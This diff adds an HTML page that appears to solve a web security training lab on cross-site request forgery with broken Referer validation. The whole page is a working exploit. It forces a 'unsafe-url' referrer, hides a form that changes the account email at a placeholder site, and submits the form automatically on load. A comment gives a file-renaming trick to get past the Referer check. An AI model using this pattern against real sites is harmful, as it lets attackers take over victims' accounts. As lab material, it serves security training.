@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta name="referrer" content="unsafe-url">
+        <!-- On exploit server change the file name from /exploit to /WEBSITE-URL -->
+        <title>
+            Lab: CSRF with broken Referer validation
+        </title>
+    </head>
+    <body>
+        <form action="https://WEBSITE-URL/my-account/change-email" method="post">
+            <input type="hidden" name="email" value="abcd@normal-user.net">
+        </form>
+    </body>
+    <script>
+        document.forms[0].submit()
+    </script>
+</html>
